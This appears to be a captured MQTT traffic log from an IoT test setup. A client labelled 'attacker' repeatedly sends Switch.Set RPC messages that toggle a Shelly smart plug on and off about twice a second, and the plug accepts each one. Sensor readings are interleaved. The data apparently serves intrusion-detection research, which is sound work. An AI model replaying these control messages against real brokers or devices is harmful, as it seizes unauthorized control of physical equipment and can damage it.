2026-04-22T16:17:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3494 33185.349 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3495 33185.830 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33185.83,""swi"
2026-04-22T16:17:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3496 33185.846 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3497 33186.330 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33186.33,""swi"
2026-04-22T16:17:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3498 33186.349 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3499 33186.831 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33186.83,""swi"
2026-04-22T16:17:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3500 33186.848 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3501 33187.331 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33187.33,""swi"
2026-04-22T16:17:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3502 33187.349 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3503 33187.831 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33187.83,""swi"
2026-04-22T16:17:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3504 33187.848 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3505 33188.332 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33188.33,""swi"
2026-04-22T16:17:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3506 33188.351 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3507 33188.834 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33188.83,""swi"
2026-04-22T16:17:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3508 33188.850 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:17:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:17:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:17:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3509 33189.335 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33189.33,""swi"
2026-04-22T16:17:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3510 33189.353 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3511 33189.833 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33189.83,""swi"
2026-04-22T16:17:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3512 33189.850 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3513 33190.334 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33190.33,""swi"
2026-04-22T16:17:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3514 33190.353 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3515 33190.835 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33190.83,""swi"
2026-04-22T16:17:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3516 33190.851 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3517 33191.337 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33191.33,""swi"
2026-04-22T16:17:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3518 33191.356 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3519 33191.836 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33191.83,""swi"
2026-04-22T16:17:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3520 33191.852 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3521 33192.336 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33192.33,""swi"
2026-04-22T16:17:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3522 33192.354 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3523 33192.837 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33192.83,""swi"
2026-04-22T16:17:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3524 33192.853 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3525 33193.337 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33193.33,""swi"
2026-04-22T16:17:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3526 33193.356 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3527 33193.840 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33193.84,""swi"
2026-04-22T16:17:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3528 33193.857 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3529 33194.338 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33194.34,""swi"
2026-04-22T16:17:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3530 33194.357 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3531 33194.839 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33194.84,""swi"
2026-04-22T16:17:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3532 33194.857 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3533 33195.343 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33195.34,""swi"
2026-04-22T16:17:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3534 33195.362 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3535 33195.840 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33195.84,""swi"
2026-04-22T16:17:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3536 33195.857 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:43,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3537 33196.343 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:43,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:43,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33196.34,""swi"
2026-04-22T16:17:43,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3538 33196.362 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:44,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:44,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3539 33196.847 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:44,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:44,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33196.84,""swi"
2026-04-22T16:17:44,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3540 33196.863 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:44,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:44,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3541 33197.360 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:44,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:44,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33197.36,""swi"
2026-04-22T16:17:44,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3542 33197.379 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:45,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:45,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3543 33197.854 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:45,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:45,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33197.85,""swi"
2026-04-22T16:17:45,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3544 33197.870 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:45,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:45,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3545 33198.354 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:45,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:45,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33198.35,""swi"
